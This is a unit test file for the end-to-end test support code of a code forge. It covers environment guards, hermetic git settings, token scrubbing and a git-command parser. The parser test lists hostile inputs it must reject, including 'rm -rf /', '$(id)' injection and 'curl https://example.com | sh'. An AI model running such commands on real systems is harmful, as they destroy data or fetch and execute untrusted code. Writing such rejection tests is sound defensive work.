// Unit tests for the pure parts of the e2e suites' support code
// (e2e/support/*): the stage reader and its guards, the hermetic git
// environment, the lane-command parser, the deterministic fixtures (rebuilt
// with the local git), the settled-slot counts, the manifest-derived tab
// table, the MCP reply parser and the "unrouted" and "server error" rules.
// The flow helpers (shared store, loop stages, labels, gateway checks) are
// in flows.test.ts.

import { deepStrictEqual, equal, match, ok, throws } from "node:assert/strict";
import * as path from "node:path";
import {
	ISSUER_RE as IDP_ISSUER_RE,
	REDIRECT_URI_RE,
} from "../../tools/mock-idp/src/config.ts";
import {
	BROKEN_CONFIG_FIXTURE,
	buildFixture,
	buildHistory,
	FIXTURE,
	FIXTURE_COMMITS,
	FIXTURE_HEAD,
	FIXTURE_SHAS,
	LOOP_FIXTURE,
} from "../../e2e/support/fixture-repo.ts";
import { gitEnv, parseGitCommands, scrubber } from "../../e2e/support/git.ts";
import {
	failedRequests,
	withFailedRequests,
} from "../../e2e/support/api-status.ts";
import { isUnrouted, routeProblem } from "../../e2e/support/http.ts";
import { parseRpcReply } from "../../e2e/support/mcp.ts";
import { repoPathOf, repoSlug } from "../../e2e/support/names.ts";
import {
	FORGE_ORIGIN_RE,
	ISSUER_RE,
	readStage,
	RUN_ID_RE,
	StageError,
	tokensOf,
} from "../../e2e/support/stage.ts";
import { packTabs, tabRoute } from "../../e2e/support/tabs.ts";
import {
	activeChangeTab,
	ctxOfSlotRequest,
	instanceCount,
	RENDERED,
	tabContribution,
} from "../../e2e/support/view.ts";
import { FORGE_ORIGIN_RE as GUARD_FORGE_RE } from "./guards.ts";
import { RUN_ID_RE as LAUNCHER_RUN_ID_RE } from "./provision.ts";

const ENV = {
	TARTAN_E2E_ORIGIN: "https://tartan-dev-e2e.acme.workers.dev",
	TARTAN_E2E_ISSUER: "https://tartan-e2e--idp.acme.workers.dev",
	TARTAN_E2E_RUN_ID: "r202610051200abcd",
	TARTAN_E2E_CONTAINERS: "1",
	TARTAN_E2E_PASSWORD_OWNER: "o".repeat(43),
	TARTAN_E2E_PASSWORD_DEVELOPER: "d".repeat(43),
	TARTAN_E2E_PASSWORD_REPORTER: "r".repeat(43),
	TARTAN_E2E_PASSWORD_OUTSIDER: "x".repeat(43),
};
const TOKENS = {
	TARTAN_E2E_OWNER_PAT: `tpat_${"a".repeat(43)}`,
	TARTAN_E2E_REPORTER_PAT: `tpat_${"b".repeat(43)}`,
	TARTAN_E2E_READ_PAT: `tpat_${"e".repeat(43)}`,
	TARTAN_E2E_DEVELOPER_AGENT: `tagt_${"c".repeat(43)}`,
	TARTAN_E2E_DEVELOPER_AGENT_B: `tagt_${"f".repeat(43)}`,
};

Deno.test("the stage patterns are the launcher's and the IdP's", () => {
	equal(FORGE_ORIGIN_RE.source, GUARD_FORGE_RE.source);
	equal(ISSUER_RE.source, IDP_ISSUER_RE.source);
	equal(RUN_ID_RE.source, LAUNCHER_RUN_ID_RE.source);
	// The IdP's only redirect is this forge pattern's callback.
	ok(REDIRECT_URI_RE.test(`${ENV.TARTAN_E2E_ORIGIN}/-/auth/callback`));
});

Deno.test("the stage reader accepts the launcher's values only", () => {
	const listed = readStage(ENV);
	equal(listed.origin, ENV.TARTAN_E2E_ORIGIN);
	equal(listed.containers, true);
	equal(listed.tokens, undefined);
	throws(() => tokensOf(listed), StageError);
	const run = readStage({ ...ENV, ...TOKENS });
	equal(run.tokens?.developerAgent, TOKENS.TARTAN_E2E_DEVELOPER_AGENT);
	equal(run.tokens?.developerAgentB, TOKENS.TARTAN_E2E_DEVELOPER_AGENT_B);
	equal(run.tokens?.readPat, TOKENS.TARTAN_E2E_READ_PAT);
	const { TARTAN_E2E_DEVELOPER_AGENT_B: _b, ...withoutB } = TOKENS;
	throws(() => readStage({ ...ENV, ...withoutB }), /incomplete/);

	const refused = (env: Record<string, string>, re: RegExp) =>
		throws(() => readStage(env), (e: unknown) => {
			ok(e instanceof StageError);
			match(e.message, re);
			// Never the value.
			for (const value of Object.values(env)) {
				if (value.length >= 16) ok(!e.message.includes(value));
			}
			return true;
		});
	refused(
		{ ...ENV, TARTAN_E2E_ORIGIN: "https://code.rawkode.academy" },
		/TARTAN_E2E_ORIGIN/,
	);
	refused(
		{ ...ENV, TARTAN_E2E_ORIGIN: "http://tartan-dev-e2e.acme.workers.dev" },
		/TARTAN_E2E_ORIGIN/,
	);
	refused(
		{ ...ENV, TARTAN_E2E_ISSUER: "https://id.rawkode.academy" },
		/TARTAN_E2E_ISSUER/,
	);
	refused(
		{ ...ENV, TARTAN_E2E_ISSUER: "https://tartan-e2e--idp.other.workers.dev" },
		/same workers\.dev subdomain/,
	);
	refused({ ...ENV, TARTAN_E2E_RUN_ID: "latest" }, /TARTAN_E2E_RUN_ID/);
	refused({ ...ENV, TARTAN_E2E_PASSWORD_OWNER: "short" }, /PASSWORD_OWNER/);
	refused(
		{ ...ENV, TARTAN_E2E_OWNER_PAT: TOKENS.TARTAN_E2E_OWNER_PAT },
		/incomplete/,
	);
	refused(
		{ ...ENV, ...TOKENS, TARTAN_E2E_DEVELOPER_AGENT: `tpat_${"c".repeat(43)}` },
		/DEVELOPER_AGENT is malformed/,
	);
	const { TARTAN_E2E_RUN_ID: _, ...noRun } = ENV;
	refused(noRun, /TARTAN_E2E_RUN_ID is not set/);
});

Deno.test("git runs hermetic, with the token only in a header scoped to the forge", () => {
	const token = TOKENS.TARTAN_E2E_DEVELOPER_AGENT;
	const env = gitEnv({
		home: "/tmp/h",
		auth: { origin: ENV.TARTAN_E2E_ORIGIN, token },
		parent: {
			PATH: "/usr/bin",
			GIT_TRACE: "1",
			GIT_CURL_VERBOSE: "1",
			GIT_ASKPASS: "/bin/echo",
			GIT_CONFIG_PARAMETERS: "'credential.helper=store'",
			SSH_AUTH_SOCK: "/tmp/agent",
		},
	});
	equal(env.HOME, "/tmp/h");
	equal(env.PATH, "/usr/bin");
	equal(env.GIT_CONFIG_NOSYSTEM, "1");
	equal(env.GIT_TERMINAL_PROMPT, "0");
	for (
		const name of [
			"GIT_TRACE",
			"GIT_CURL_VERBOSE",
			"GIT_ASKPASS",
			"GIT_CONFIG_PARAMETERS",
			"SSH_AUTH_SOCK",
		]
	) {
		equal(env[name], undefined, name);
	}
	const withToken = Object.entries(env).filter(([, v]) => v.includes(token));
	deepStrictEqual(withToken.map(([k]) => k), [
		`GIT_CONFIG_VALUE_${Number(env.GIT_CONFIG_COUNT) - 1}`,
	]);
	const key = env[`GIT_CONFIG_KEY_${Number(env.GIT_CONFIG_COUNT) - 1}`];
	equal(key, `http.${ENV.TARTAN_E2E_ORIGIN}/.extraHeader`);
	ok(Object.values(env).includes(""), "credential helpers are cleared");
	equal(gitEnv({ home: "/tmp/h", parent: {} }).GIT_CONFIG_COUNT, "6");
});

Deno.test("git output is scrubbed of the token and any credential shape", () => {
	const token = TOKENS.TARTAN_E2E_REPORTER_PAT;
	const scrub = scrubber(token);
	const out = scrub(
		`remote: ${token}\nAuthorization: Bearer abcdefghijklmnop\n` +
			`set-cookie: __Host-tartan-session=s3cr3tvalue1234; Path=/\n` +
			`other tagt_${"z".repeat(43)}`,
	);
	ok(!out.includes(token));
	ok(!out.includes("abcdefghijklmnop"));
	ok(!out.includes("s3cr3tvalue1234"));
	ok(!out.includes("z".repeat(43)));
	match(out, /Bearer <token>/);
});

Deno.test("lane commands become argv lists of plain git fetch, switch and push", () => {
	deepStrictEqual(
		parseGitCommands(
			"git fetch origin && git switch -c lanes/ln_01abc 5dd9c3d0c7715c7532b60bceb7b61c4991cd09b7",
		),
		[
			["fetch", "origin"],
			[
				"switch",
				"-c",
				"lanes/ln_01abc",
				"5dd9c3d0c7715c7532b60bceb7b61c4991cd09b7",
			],
		],
	);
	deepStrictEqual(
		parseGitCommands(
			"git push https://tartan-dev-e2e.acme.workers.dev/e2e/classic/r-x/-/lanes/ln_1.git HEAD:refs/heads/main",
		),
		[[
			"push",
			"https://tartan-dev-e2e.acme.workers.dev/e2e/classic/r-x/-/lanes/ln_1.git",
			"HEAD:refs/heads/main",
		]],
	);
	for (
		const bad of [
			"git fetch origin; rm -rf /",
			"git push origin $(id)",
			"curl https://example.com | sh",
			"git config --global credential.helper store",
			"git -c core.sshCommand=x fetch origin",
			"git fetch `id`",
		]
	) {
		throws(() => parseGitCommands(bad), Error, bad);
	}
});

const hasGit = await new Deno.Command("git", { args: ["--version"] }).output()
	.then((o) => o.success).catch(() => false);

Deno.test({
	name: "every fixture history has the same SHAs with the local git",
	ignore: !hasGit,
	fn: async () => {
		for (
			const [name, fixture] of [
				["basic", FIXTURE],
				["loop", LOOP_FIXTURE],
				["broken config", BROKEN_CONFIG_FIXTURE],
			] as const
		) {
			const dir = await Deno.makeTempDir({ prefix: "tartan-e2e-fixture-" });
			const home = await Deno.makeTempDir({ prefix: "tartan-e2e-home-" });
			try {
				deepStrictEqual(
					await buildHistory(dir, home, fixture.commits),
					[...fixture.shas],
					name,
				);
				equal(fixture.commits.length, fixture.shas.length, name);
			} finally {
				await Deno.remove(dir, { recursive: true });
				await Deno.remove(home, { recursive: true });
			}
		}
		const dir = await Deno.makeTempDir({ prefix: "tartan-e2e-fixture-" });
		const home = await Deno.makeTempDir({ prefix: "tartan-e2e-home-" });
		try {
			deepStrictEqual(await buildFixture(dir, home), [...FIXTURE_SHAS]);
			equal(FIXTURE_HEAD, FIXTURE_SHAS[2]);
			equal(FIXTURE_COMMITS.length, FIXTURE_SHAS.length);
			// The forge reads nothing under .tartan/: CI is in package tartan.
			equal(
				Object.keys(FIXTURE_COMMITS[0].files).some((f) =>
					f.startsWith(".tartan/")
				),
				false,
			);
		} finally {
			await Deno.remove(dir, { recursive: true });
			await Deno.remove(home, { recursive: true });
		}
	},
});

const view = {
	static: {
		tabs: [
			{
				installationId: "i1",
				ext: "tartan.changes",
				slot: "change.tab",
				id: "revisions",
				route: "revisions",
				order: 2,
			},
			{
				installationId: "i1",
				ext: "tartan.changes",
				slot: "change.tab",
				id: "diff",
				route: "diff",
				order: 1,
			},
			{
				installationId: "i2",
				ext: "tartan.board",
				slot: "repo.tab",
				id: "repo-board",
				route: "board",
				order: 0,
			},
		],
		nav: [],
		actions: [],
	},
} as const;

Deno.test("the settled-slot count follows what each page mounts", () => {
	const slots = [
		{ slot: "repo.sidebar", id: "projects" },
		{ slot: "repo.tab", id: "work" },
		{ slot: "repo.tab", id: "changes" },
		{ slot: "file.banner", id: "editing" },
		{ slot: "change.panel", id: "overview" },
		{ slot: "change.panel", id: "threads" },
		{ slot: "change.tab", id: "diff" },
		{ slot: "change.tab", id: "revisions" },
	] as const;
	equal(instanceCount(slots, RENDERED.repoCode), 1);
	equal(instanceCount(slots, RENDERED.blob), 2);
	equal(instanceCount(slots, RENDERED.repoTab("work")), 2);
	equal(instanceCount(slots, RENDERED.none), 0);
	equal(instanceCount(slots, RENDERED.change("diff")), 3);
	equal(activeChangeTab(view), "diff");
	equal(activeChangeTab(view, "revisions"), "revisions");
	equal(activeChangeTab({ static: { tabs: [], nav: [], actions: [] } }), null);
	equal(tabContribution(view, "board")?.id, "repo-board");
	equal(tabContribution(view, "weave"), null);
});

Deno.test("a slot request's ctx hint decodes from its URL", () => {
	const hint = {
		node: "e2e/classic/r-x",
		entity: { kind: "change", id: "c_1" },
	};
	const b64 = btoa(JSON.stringify(hint)).replace(/\+/g, "-").replace(/\//g, "_")
		.replace(/=+$/, "");
	deepStrictEqual(
		ctxOfSlotRequest(
			`https://tartan-dev-e2e.acme.workers.dev/-/api/slot/i1/threads?ctx=${b64}`,
		),
		hint,
	);
});

Deno.test("the tab table comes from the pack manifests", () => {
	const tabs = packTabs();
	for (const pack of ["swarm", "classic"] as const) {
		const repoTabs = tabs.filter((t) =>
			t.pack === pack && t.slot === "repo.tab"
		);
		ok(repoTabs.some((t) => t.ext === "tartan.work"), `${pack} has Work`);
		ok(repoTabs.some((t) => t.ext === "tartan.changes"), `${pack} has Changes`);
	}
	const keys = tabs.map((t) => `${t.pack}/${t.slot}/${t.ext}/${t.id}`);
	equal(new Set(keys).size, keys.length, "one test per tab");
	for (const t of tabs) {
		match(t.route, /^[a-z0-9-]+(?:\/[a-z0-9-]+)*$/, t.id);
		ok(t.label !== "", t.id);
	}
	equal(tabRoute({ id: "x", route: "board/*" }), "board");
	equal(tabRoute({ id: "x" }), "x");
});

Deno.test("a pack naming an extension without a manifest fails collection", async () => {
	const root = await Deno.makeTempDir({ prefix: "tartan-e2e-ext-" });
	try {
		for (const pack of ["swarm", "classic"]) {
			await Deno.mkdir(path.join(root, "packs", pack), { recursive: true });
			await Deno.writeTextFile(
				path.join(root, "packs", pack, "tartan.json"),
				JSON.stringify({ members: [{ id: "tartan.gone" }] }),
			);
		}
		throws(() => packTabs(root), /tartan\.gone/);
	} finally {
		await Deno.remove(root, { recursive: true });
	}
});

Deno.test("MCP replies are read as JSON or as an event stream", () => {
	const json = JSON.stringify({ jsonrpc: "2.0", id: 2, result: { ok: 1 } });
	deepStrictEqual(parseRpcReply(json, "application/json", 2)?.result, {
		ok: 1,
	});
	equal(parseRpcReply(json, "application/json", 3), null);
	const sse = `event: message\ndata: ${
		JSON.stringify({ jsonrpc: "2.0", method: "notifications/progress" })
	}\n\ndata: ${json}\n\n`;
	deepStrictEqual(parseRpcReply(sse, "text/event-stream", 2)?.result, {
		ok: 1,
	});
	equal(parseRpcReply("<html>", "text/html", 2), null);
});

Deno.test("only a missing route counts as unrouted, not a missing thing", () => {
	const reply = (status: number, message = "") => ({
		status,
		body: null,
		error: message === "" ? null : { code: "not_found", reason: "", message },
	});
	ok(isUnrouted(reply(405)));
	ok(isUnrouted(reply(501)));
	ok(isUnrouted(reply(404, "no route for /-/api/settings")));
	ok(isUnrouted(reply(404, "route")));
	ok(!isUnrouted(reply(404, "no such repo")));
	ok(!isUnrouted(reply(403)));
	ok(!isUnrouted(reply(200)));
	// A crashing route is broken too, though it exists.
	equal(routeProblem(reply(500)), "server error");
	equal(routeProblem(reply(503)), "server error");
	equal(routeProblem(reply(405)), "unrouted");
	equal(routeProblem(reply(404, "no such repo")), null);
	equal(routeProblem(reply(403)), null);
	equal(routeProblem(reply(200)), null);
});

Deno.test("run fixtures are named after the run", () => {
	equal(repoSlug("r202610051200abcd", "browse"), "r202610051200abcd-browse");
	equal(
		repoPathOf("classic", "r202610051200abcd", "issues"),
		"e2e/classic/r202610051200abcd-issues",
	);
	throws(() => repoSlug("r202610051200abcd", "Bad Name"));
	throws(() => repoSlug("r202610051200abcd", "../x"));
});

Deno.test("a lane's config preview 404 is designed; other 404s and 5xx still fail a page", () => {
	const lanePreview = "/-/api/repos/01m45/lanes/ln_01m45/config";
	deepStrictEqual(
		failedRequests([
			{ path: lanePreview, status: 404 },
			{ path: "/-/api/repos/01m45/config", status: 404 },
			{ path: lanePreview, status: 500 },
			{ path: "/-/api/view", status: 200 },
		]),
		["404 /-/api/repos/01m45/config", `500 ${lanePreview}`],
	);
	deepStrictEqual(
		failedRequests([{ path: "/-/api/admin/x", status: 501 }], [
			{ path: /^\/-\/api\/admin\//, status: 501 },
		]),
		[],
	);
});

Deno.test("a failed page check names the page's failed API requests", async () => {
	const failing = () => Promise.reject(new Error("heading not visible"));
	const err = await withFailedRequests(failing, () =>
		Promise.resolve([
			{ path: "/-/api/view", status: 200 },
			{ path: "/-/api/commit", status: 500 },
		])).catch((e: Error) => e);
	match(err.message, /heading not visible/);
	match(err.message, /failed on this page: 500 \/-\/api\/commit/);
	const plain = await withFailedRequests(
		failing,
		() => Promise.reject(new Error("page gone")),
	).catch((e: Error) => e);
	equal(plain.message, "heading not visible", "the original error stays");
	equal(
		await withFailedRequests(
			() => Promise.resolve(7),
			() => Promise.resolve([]),
		),
		7,
	);
});

Deno.test("a repo's projects 404 while projects are off is a designed not-found (merged-tree run)", () => {
	equal(
		failedRequests([
			{ path: "/-/api/repos/01k6rrrrrrrrrrrrrrrrrrrrrr/projects", status: 404 },
		]).length,
		0,
	);
	deepStrictEqual(
		failedRequests([
			{
				path: "/-/api/repos/01k6rrrrrrrrrrrrrrrrrrrrrr/projects/app",
				status: 404,
			},
			{ path: "/-/api/repos/01k6rrrrrrrrrrrrrrrrrrrrrr/projects", status: 500 },
		]),
		[
			"404 /-/api/repos/01k6rrrrrrrrrrrrrrrrrrrrrr/projects/app",
			"500 /-/api/repos/01k6rrrrrrrrrrrrrrrrrrrrrr/projects",
		],
	);
});
